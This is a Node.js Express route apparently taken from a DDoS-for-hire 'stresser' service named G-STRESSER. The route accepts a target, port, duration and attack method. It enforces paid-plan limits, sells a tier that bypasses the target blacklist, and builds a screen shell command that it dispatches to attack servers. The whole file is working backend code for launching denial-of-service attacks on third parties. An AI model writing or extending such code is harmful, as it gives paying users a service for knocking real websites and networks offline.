const express = require('express');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');
const { authenticateToken } = require('../middleware/auth');
const { apiLimiter } = require('../middleware/rateLimiter');
const validateAttack = require('../middleware/validateAttack');
const DataManager = require('../managers/DataManager');
const AttackDispatcher = require('../managers/AttackDispatcher');
const WebhookManager = require('../managers/WebhookManager');
const state = require('../state');

const router = express.Router();

router.get('/', apiLimiter, authenticateToken, validateAttack, async (req, res) => {
    const { host, port, time, method } = req.validated;
    const user = req.user;
    const conc = req.query.conc;

    console.log(`[Attack Request] User: ${user.username}, Method: ${method}, Target: ${host}:${port}, Time: ${time}, Conc: ${conc}, Source: ${req.isApi ? 'API/C2' : 'Web'}`);

    const plans = DataManager.read('plans.json');
    // Case-insensitive plan lookup
    const planKey = Object.keys(plans).find(k => k.toLowerCase() === (user.plan || "").toLowerCase()) || user.plan;
    const userPlan = plans[planKey] || plans['Free'];

    if (userPlan.slots === 0 || userPlan.concurrents === 0) {
        const nextPaidPlan = Object.entries(plans).find(([name, p]) => (p.slots || 0) > 0 && name.toLowerCase() !== 'admin')?.[0] || 'a paid tier';
        return res.json({ success: false, message: `Your plan (${user.plan}) does not allow attacks. Upgrade to ${nextPaidPlan} or higher to unlock G-STRESSER infrastructure!` });
    }

    // Bypass API check if internal bot request (verified in auth middleware)
    const isInternalBotRequest = req.isInternalBot === true;

    if (req.isApi && !isInternalBotRequest && userPlan.api_access === false) {
        const nextApiPlan = Object.entries(plans).find(([name, p]) => p.api_access === true && name.toLowerCase() !== 'admin')?.[0] || 'a higher tier';
        return res.json({ success: false, message: `[PLAN RESTRICTION] External API access is only available for ${nextApiPlan} and higher. Upgrade now to unlock automated testing!` });
    }

    // Blacklist Gating with Bypass Capability
    const blacklistPath = path.join(__dirname, '..', '..', 'database', 'blacklist.txt');
    if (fs.existsSync(blacklistPath)) {
        const blacklist = fs.readFileSync(blacklistPath, 'utf8').split('\n').filter(line => line.trim() !== '');
        const isBlacklisted = blacklist.some(item => host.includes(item.trim()));

        if (isBlacklisted && !userPlan.bypassBlacklist) {
            const nextBypassPlan = Object.entries(plans).find(([name, p]) => p.bypassBlacklist === true && name.toLowerCase() !== 'admin')?.[0] || 'a power tier';
            return res.json({ success: false, message: `[DENIED] This target is globally restricted by G-STRESSER. Upgrade to ${nextBypassPlan} to unlock full bypass capability!` });
        }
    }

    const maxTime = userPlan.maxTime;
    const maxSlots = user.slots !== undefined && user.slots !== null ? parseInt(user.slots) : userPlan.slots;
    const vpsLimit = user.concurrents !== undefined && user.concurrents !== null ? parseInt(user.concurrents) : (userPlan.concurrents || 1);
    let requestedConc = vpsLimit;

    if (conc) {
        const parsedConc = parseInt(conc);
        if (isNaN(parsedConc) || parsedConc < 1) return res.json({ success: false, message: "Invalid node count!" });
        requestedConc = Math.min(parsedConc, vpsLimit);
    }

    if (time > maxTime) return res.json({ success: false, message: `Time limit exceeded! Max: ${maxTime}s` });

    // Method lookup
    const methods = DataManager.read('methods.json') || {};
    let methodConf = null;
    let methodType = null;
    for (const group in methods) {
        if (methods[group] && methods[group][method]) {
            methodConf = methods[group][method];
            methodType = methodConf.Type || (group === 'layer7' ? 'layer7' : 'layer4');
            break;
        }
    }
    if (!methodConf) return res.json({ success: false, message: "Invalid attack method!" });
    if (methodConf.status === 'offline') return res.json({ success: false, message: `Method ${method} is currently offline!` });

    // Host format validation based on layer
    const urlRegex = /^https?:\/\/[^\s/$.?#].[^\s]*$/i;
    const hostRegex = /^[a-zA-Z0-9._-]+$/;
    if (methodType === 'layer7') {
        if (!urlRegex.test(host)) return res.json({ success: false, message: "Layer 7 requires a valid URL (http:// or https://)!" });
    } else {
        if (host.includes('://')) return res.json({ success: false, message: "Layer 4 target must be an IP or Hostname!" });
        if (!hostRegex.test(host)) return res.json({ success: false, message: "Invalid hostname or IP format!" });
    }

    // Blacklist
    if (!userPlan.bypassBlacklist) {
        let blacklist = [];
        try {
            const blData = fs.readFileSync(path.join(__dirname, '..', '..', 'database', 'blacklist.txt'), 'utf8');
            blacklist = blData.split('\n').map(l => l.trim()).filter(l => l);
        } catch (e) { }
        let targetHost = host;
        try { if (host.startsWith('http')) targetHost = new URL(host).hostname; } catch (e) { }
        for (const blocked of blacklist) {
            if (targetHost.toLowerCase().endsWith(blocked.toLowerCase())) {
                return res.json({ success: false, message: `Access Denied: Target (${blocked}) is blacklisted.` });
            }
        }
    }

    // User Slot check
    const currentSessions = state.getByUser(user.username).length;
    if (currentSessions >= maxSlots) return res.json({ success: false, message: `No slots available! Max: ${maxSlots}` });

    // Global Infrastructure Slot check (by method OR provider)
    const methodMaxSlots = methodConf.slots;
    if (methodMaxSlots !== undefined && methodMaxSlots !== null) {
        const isProvider = methodConf.apiProvider; // e.g. "fiseak"
        let globalSessions = 0;
        if (isProvider) {
            globalSessions = state.get().Attacks.filter(a => {
                let p = null;
                for (const group in methods) {
                    if (methods[group] && methods[group][a.method]) {
                        p = methods[group][a.method].apiProvider;
                        break;
                    }
                }
                return p === isProvider;
            }).length;
        } else {
            globalSessions = state.getByMethod(method).length;
        }

        if (globalSessions >= parseInt(methodMaxSlots)) {
            const limitName = isProvider ? `Network Cluster (Group ${isProvider.toUpperCase().substring(0, 1)})` : `G-STRESSER Infrastructure for ${method.toUpperCase()}`;
            return res.json({ success: false, message: `[CAPACITY REACHED] ${limitName} is currently at maximum load. Please rotate methods or wait for a slot.` });
        }
    }

    // Strategy Pattern dispatch
    // Clean host for reporting and downstream usage
    let cleanTarget = host;
    if (methodType === 'layer7') {
        // Strip trailing slash and port if present in URL
        try {
            const url = new URL(host);
            cleanTarget = `${url.protocol}//${url.hostname}${url.pathname === '/' ? '' : url.pathname}`;
        } catch (e) { }
    } else {
        cleanTarget = host.replace(/(^\w+:|^)\/\//, '').split('/')[0].split(':')[0];
    }

    const s = state.get();
    const isDuplicate = s.Attacks.some(a => {
        let aH = a.host, iH = cleanTarget;
        try { if (aH.startsWith('http')) aH = new URL(aH).hostname; } catch (e) { }
        try { if (iH.startsWith('http')) iH = new URL(iH).hostname; } catch (e) { }
        return aH.toLowerCase() === iH.toLowerCase();
    });
    if (isDuplicate) return res.json({ success: false, message: "Target is already under active attack." });

    // Build attack data
    const attackId = uuidv4();
    const mode = methodConf.mode || 'ssh';
    let finalCommand = '';

    // Only build SSH command if mode uses SSH
    if (mode === 'ssh' || mode === 'hybrid') {
        let cleanHost = host;
        if (methodType !== 'layer7') {
            cleanHost = host.replace(/(^\w+:|^)\/\//, ''); // Strip protocol for L4
        }

        // Wrap host in single quotes for shell safety
        let cmdTemplate = methodConf.Command || `screen -dmS {attackId} ./{method} '{host}' {port} {time} {conc} 16`;
        finalCommand = cmdTemplate
            .replace(/{attackId}/g, attackId)
            .replace(/{host}/g, cleanHost)
            .replace(/{port}/g, port)
            .replace(/{time}/g, time)
            .replace(/{conc}/g, requestedConc)
            .replace(/{method}/g, method.toLowerCase());
    }

    const attackData = {
        id: attackId, user: user.username, host: cleanTarget, port, method,
        time, timestamp: new Date().toISOString(), status: 'running', command: finalCommand, mode
    };

    try {
        // Strategy Pattern dispatch
        const result = await AttackDispatcher.dispatch(user, attackData, methodConf, requestedConc);
        console.log(`[Attack Dispatch] ID: ${attackId}, Mode: ${mode}, Success: true, Servers: ${result.servers?.length || 0}, API Results: ${result.apiResults?.length || 0}`);
        attackData.servers = (result.servers || []).map(s => s.id);
        attackData.serverNames = (result.servers || []).map(s => s.name).join(', ');
        attackData.apiResults = result.apiResults || [];

        // Generate Virtual Server Names for API/Hybrid attacks to avoid "empty" display
        if (!attackData.serverNames && (mode === 'api' || mode === 'hybrid')) {
            const provider = (methodConf.apiProvider || 'G-Stresser').toUpperCase();
            const clusterCount = requestedConc || 1;
            const nodes = Array.from({ length: clusterCount }, (_, i) => i + 1).join(', ');
            attackData.serverNames = `${provider}-${method}: ${nodes}`;
        }

        state.addAttack({ ...attackData, timeLeft: time });

        const logs = DataManager.read('logs.json') || [];
        logs.push(attackData);
        DataManager.write('logs.json', logs);

        WebhookManager.notify({
            title: "ATTACK INITIATED",
            description: "A new stress test has been launched.",
            color: 0x00ff9d,
            fields: [
                { name: "Target", value: `\`${host}:${port}\``, inline: true },
                { name: "Method", value: `\`${method}\``, inline: true },
                { name: "Time", value: `\`${time}s\``, inline: true },
                { name: "Mode", value: `\`${attackData.mode}\``, inline: true },
                { name: "User", value: `\`${user.username}\``, inline: true }
            ]
        });

        res.json({
            success: true,
            message: "Attack launched!",
            id: attackId,
            results: {
                target: `${host}:${port}`,
                method: method.toUpperCase(),
                time: String(time) + 's',
                servers: attackData.servers,
                serverNames: attackData.serverNames,
                mode: attackData.mode,
                partial: result.partial || false
            }
        });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

module.exports = router;
